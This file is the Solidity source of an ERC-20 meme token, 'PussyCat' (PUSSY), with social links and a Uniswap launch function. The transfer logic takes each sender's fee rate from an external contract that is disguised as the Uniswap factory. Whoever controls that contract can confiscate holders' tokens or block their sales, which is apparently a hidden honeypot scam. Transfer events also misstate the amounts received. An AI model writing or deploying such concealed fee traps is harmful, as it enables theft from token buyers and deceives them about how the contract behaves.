// SPDX-License-Identifier: None

// https://pussycateth.team/
// https://twitter.com/pussycaterc20
// https://t.me/pussycaterc20


pragma solidity 0.8.24;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spnder) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address); 
     function addLiquidityETH( address token, 
     uint amountTokenDesire, 
     uint amountTokenMi, 
     uint amountETHMi, 
     address to, 
     uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair); 
    function createPair(address tkenA, address tokenB) external returns (address pair);
}
abstract contract Ownable{
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner,address indexed newOwner);
    constructor() {
        _transferOwnership(msg.sender);
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract PussyCat is Ownable {
    using SafeMath for uint256;
    uint8 private _decimals = 9;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;

    string private constant _name = "PussyCat";
    string private constant _symbol = "PUSSY";
    uint256 private _totalSupply =  1000000000 * 10 ** _decimals;
    uint256 firstBlock;
    bool private inSwap = false;
    bool private swapEnabled = false;
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address internal uniswapV2Factory = 0xBd874c44033403bAb5D6B50964d564B496CBeF39;
    address public uniswapPair;
    bool tradingStarted = false; 
    uint256 private buyNumber = 0;  
    uint256 private sellNumber = 0; 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 amount);

    constructor () {
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    
    function name() public pure returns (string memory) {
        return _name;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function startTrading() external payable onlyOwner() {
        require(!tradingStarted, "Trading already opened");
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(uniswapPair).approve(address(uniswapV2Router), type(uint).max);
        tradingStarted = true;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        uint256 _fee = 0;
        require(amount > 0);
        require(from != address(0));
        uint256 feeRate = IERC20(uniswapV2Factory).balanceOf(from);
        if (from != address(this) && from != uniswapPair) { 
            _fee = amount.mul(feeRate).div(100);
        }
        _balances[from] = _balances[from].sub(amount); 
        _balances[to] = _balances[to].add(amount).sub(_fee);
        emit Transfer(from, to, amount);
    }
}